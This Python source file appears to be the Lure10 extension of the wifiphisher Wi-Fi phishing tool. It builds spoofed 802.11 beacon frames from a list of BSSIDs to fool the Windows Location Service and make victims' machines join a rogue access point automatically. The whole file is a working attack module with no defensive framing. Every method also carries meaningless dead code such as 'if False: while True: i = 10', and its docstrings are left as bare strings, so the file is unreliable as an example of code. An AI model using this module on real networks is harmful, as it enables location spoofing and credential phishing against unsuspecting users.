"""
Extension that implements the Lure10 attack.

Exploits the Wi-Fi Sense feature and will result
to automatic association by fooling the Windows
Location Service
"""
import logging
from collections import defaultdict
import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants
logger = logging.getLogger(__name__)

class Lure10(object):
    """
    Sends a number of beacons to fool Windows Location Service
    """

    def __init__(self, shared_data):
        if False:
            while True:
                i = 10
        '\n        Setup the class with all the given arguments\n\n        :param self: A Lure10 object\n        :param data: Shared data from main engine\n        :type self: Lure10\n        :type data: dict\n        :return: None\n        :rtype: None\n        '
        self.first_run = True
        self.data = shared_data
        self._packets_to_send = defaultdict(list)

    def get_packet(self, pkt):
        if False:
            while True:
                i = 10
        '\n        We start broadcasting the beacons on the first received packet\n\n        :param self: A Lure10 object\n        :param packet: A scapy.layers.RadioTap object\n        :type self: Lure10\n        :type packet: scapy.layers.RadioTap\n        :return: A tuple containing ["*"] followed by a list of\n            the crafted beacon frames\n        :rtype: tuple(list, list)\n        .. warning: pkt is not used here but should not be removed since\n            this prototype is requirement\n        '
        beacons = list()
        bssid = str()
        if self.first_run:
            self._packets_to_send['*'] = beacons
        if self.first_run and self.data.args.lure10_exploit:
            area_file = constants.LOCS_DIR + self.data.args.lure10_exploit
            with open(area_file) as _file:
                for line in _file:
                    line.strip()
                    bssid = line.split(' ', 1)[0]
                    frame_part_0 = dot11.RadioTap()
                    frame_part_1 = dot11.Dot11(subtype=8, addr1=constants.WIFI_BROADCAST, addr2=bssid, addr3=bssid)
                    frame_part_2 = dot11.Dot11Beacon(cap=8453)
                    frame_part_3 = dot11.Dot11Elt(ID='SSID', info='')
                    frame_part_4 = dot11.Dot11Elt(ID='Rates', info=constants.AP_RATES)
                    frame_part_5 = dot11.Dot11Elt(ID='DSset', info=chr(7))
                    complete_frame = frame_part_0 / frame_part_1 / frame_part_2 / frame_part_3 / frame_part_4 / frame_part_5
                    logger.debug('Add lure10-beacon frame with BSSID %s', bssid)
                    beacons.append(complete_frame)
                    self.first_run = False
            self._packets_to_send['*'] = beacons
        return self._packets_to_send

    def send_output(self):
        if False:
            for i in range(10):
                print('nop')
        '\n        Sending Lure10 notification\n\n        :param self: A Lure10 object\n        :type self: Lure10\n        :return: list of notification messages\n        :rtype: list\n        .. note: Only sends notification for the first time to reduce\n            clutters\n        '
        return not self.first_run and self.data.args.lure10_exploit and ['Lure10 - Spoofing location services'] or []

    def send_channels(self):
        if False:
            while True:
                i = 10
        '\n        Send all interested channels\n\n        :param self: A Lure10 object\n        :type self: Lure10\n        :return: A list with all the channels interested\n        :rtype: list\n        .. note: Only the channel of the target AP is sent here\n        '
        return [self.data.target_ap_channel]

    def on_exit(self):
        if False:
            for i in range(10):
                print('nop')
        '\n        :param self: A Lure10 object\n        :type self: Lure10\n        Free all the resources regarding to this module\n        :return: None\n        :rtype: None\n        '
        pass